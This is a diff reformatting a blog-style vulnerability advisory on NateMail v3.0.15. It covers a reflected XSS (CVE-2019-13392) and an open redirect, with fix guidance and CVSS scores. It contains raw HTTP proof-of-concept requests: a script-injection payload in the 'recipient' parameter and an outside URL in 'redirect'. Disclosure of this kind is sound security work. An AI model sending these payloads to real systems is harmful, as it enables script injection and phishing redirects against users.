@@ -1,7 +1,7 @@
 ---
 type: article
 title: NateMail Vulnerabilities – CVE-2019-13392
-tags: [XSS, Open Redirect ]
+tags: [XSS, Open Redirect]
 date: 2019-10-15
 author: Eno
 featuredImage: https://lh3.googleusercontent.com/VmQl2-hDYUd_mV2nZ8VIxsvsgxMy2nTmTVWC6dZnNnVoVPDaYFGKUPfheIfXpXOG7hdUu8L2bq9bH-hux87Me3xd=h700
@@ -9,11 +9,15 @@ featuredImage: https://lh3.googleusercontent.com/VmQl2-hDYUd_mV2nZ8VIxsvsgxMy2nT
 
 ## Welcome to the Security Dumpster Fire 🚨🔥
 
-NateMail v3.0.15 is a **hot mess**. We’re talking **XSS holes** wide open and **open redirects** that’ll send users straight into the void. This script hasn’t been updated in years, but if you’re reckless enough to still have it running, congrats—you’re basically an all-you-can-hack buffet. 
+NateMail v3.0.15 is a **hot mess**. We’re talking **XSS holes** wide open and **open redirects** that’ll send users
+straight into the void. This script hasn’t been updated in years, but if you’re reckless enough to still have it
+running, congrats—you’re basically an all-you-can-hack buffet.
 
-If you wanna verify how bad it is, go ahead, grab a copy. If you wanna fix it, I got you covered. If you wanna ignore it… well, don’t say I didn’t warn you. 
+If you wanna verify how bad it is, go ahead, grab a copy. If you wanna fix it, I got you covered. If you wanna ignore
+it… well, don’t say I didn’t warn you.
 
-**Side note:** MITRE straight-up refused to assign a CVE for the open redirect. Yeah, it’s that much of a joke. Anyway, here’s the breakdown. 
+**Side note:** MITRE straight-up refused to assign a CVE for the open redirect. Yeah, it’s that much of a joke. Anyway,
+here’s the breakdown.
 
 ---
 
@@ -21,13 +25,16 @@ If you wanna verify how bad it is, go ahead, grab a copy. If you wanna fix it, I
 
 ### How It Works
 
-NateMail has a **reflected XSS** flaw that lets an attacker inject JavaScript and make your users’ browsers cry. Basically, the app blindly reflects whatever garbage you throw into the `recipient` parameter, so tossing in some spicy JavaScript **executes instantly**. 🤦‍♂️
+NateMail has a **reflected XSS** flaw that lets an attacker inject JavaScript and make your users’ browsers cry.
+Basically, the app blindly reflects whatever garbage you throw into the `recipient` parameter, so tossing in some spicy
+JavaScript **executes instantly**. 🤦‍♂️
 
 ### Exploit (aka: How to Wreck It)
 
 Wanna see it in action? Here’s your golden ticket:
 
 #### Raw HTTP Request 🚀
+
 ```http
 POST /NateMail.php HTTP/1.1
 Host: <Host/IP>
@@ -39,6 +46,7 @@ recipient=%3cscript%3ealert(document.domain)%3c%2fscript%3e
 ```
 
 #### Raw HTTP Response 💀
+
 ```http
 HTTP/1.1 200 OK
 Content-Type: text/html; charset=UTF-8
@@ -53,7 +61,7 @@ Content-Type: text/html; charset=UTF-8
 </html>
 ```
 
-Yep. That’s **free XSS execution** right there. Your browser? Toast. Security? Non-existent. 
+Yep. That’s **free XSS execution** right there. Your browser? Toast. Security? Non-existent.
 
 ---
 
@@ -61,13 +69,15 @@ Yep. That’s **free XSS execution** right there. Your browser? Toast. Security?
 
 ### How It Works
 
-This genius-level code lets **anyone** send users **anywhere** by messing with the `redirect` parameter. **No validation. No restrictions. Just pure chaos.**
+This genius-level code lets **anyone** send users **anywhere** by messing with the `redirect` parameter. **No
+validation. No restrictions. Just pure chaos.**
 
 ### Exploit (aka: How to Send People to the Shadow Realm)
 
 Here’s how easy it is to hijack users:
 
 #### Raw HTTP Request ✈️
+
 ```http
 POST /NateMail.php HTTP/1.1
 Host: <Host/IP>
@@ -79,19 +89,22 @@ recipient=0&redirect=http%3A%2F%2Fwww.google.com
 ```
 
 #### Raw HTTP Response 🎯
+
 ```http
 HTTP/1.1 302 Found
 Location: http://www.google.com
 Content-Type: text/html; charset=UTF-8
 ```
 
-Boom. User clicks? **Redirected straight to whatever shady site you cooked up.** Phishing? Malvertising? Fake login pages? The possibilities are endless. 
+Boom. User clicks? **Redirected straight to whatever shady site you cooked up.** Phishing? Malvertising? Fake login
+pages? The possibilities are endless.
 
 ---
 
 ## Fix This Trainwreck 🚧
 
 ### 1️⃣ Patch the XSS Disaster
+
 - **Sanitize. Your. Inputs.** Don’t let users throw JavaScript into `recipient`.
 - **Escape outputs.** Every. Single. One.
 - Update this gem of a line:
@@ -99,9 +112,11 @@ Boom. User clicks? **Redirected straight to whatever shady site you cooked up.**
   ```php
   $errors .= "No email address was found in the recipients list with key number \"$thisRecipKey\"<br>$le";
   ```
+
   **DO NOT trust `$thisRecipKey`** unless you want XSS ruining your life.
 
 ### 2️⃣ Lock Down Open Redirects
+
 - **Whitelist valid redirect destinations.** If it ain’t on the list, it ain’t happening.
 - **Patch this monstrosity on line 638:**
 
@@ -113,18 +128,20 @@ Boom. User clicks? **Redirected straight to whatever shady site you cooked up.**
       }
   }
   ```
-  Seriously, don’t just let users go wherever the hell they want. You’re asking for trouble. 
+
+  Seriously, don’t just let users go wherever the hell they want. You’re asking for trouble.
 
 ---
 
 ## Severity & Exploitability 🔥
 
-| **Vulnerability**  | **Severity** | **CVSS Score** | **Damage Potential** |
-|-------------------|------------|--------------|------------------|
-| **XSS**          | Medium     | 6.1          | Full script execution in the victim’s browser |
-| **Open Redirect** | Medium     | 6.1          | Phishing, malware drops, and mass user redirection |
+| **Vulnerability** | **Severity** | **CVSS Score** | **Damage Potential**                               |
+| ----------------- | ------------ | -------------- | -------------------------------------------------- |
+| **XSS**           | Medium       | 6.1            | Full script execution in the victim’s browser      |
+| **Open Redirect** | Medium       | 6.1            | Phishing, malware drops, and mass user redirection |
 
 ### How Easy Is It to Exploit? 🤔
+
 - **XSS:** Literally takes 2 minutes to exploit. Copy-paste payload → Send request → Game over.
 - **Open Redirect:** Even easier. Craft a URL, send it to some unsuspecting victim, and laugh.
 
@@ -132,7 +149,8 @@ Boom. User clicks? **Redirected straight to whatever shady site you cooked up.**
 
 ## Final Thoughts: This Script Is a Joke 🎭
 
-Look, if you’re still running NateMail **in 2025**, you **deserve** to be hacked. But if you actually care about security, **patch this mess ASAP** or just nuke the whole script and switch to something that wasn’t coded by a sleep-deprived raccoon.
+Look, if you’re still running NateMail **in 2025**, you **deserve** to be hacked. But if you actually care about
+security, **patch this mess ASAP** or just nuke the whole script and switch to something that wasn’t coded by a
+sleep-deprived raccoon.
 
 Stay safe. Or don’t. Your call. 😎
-
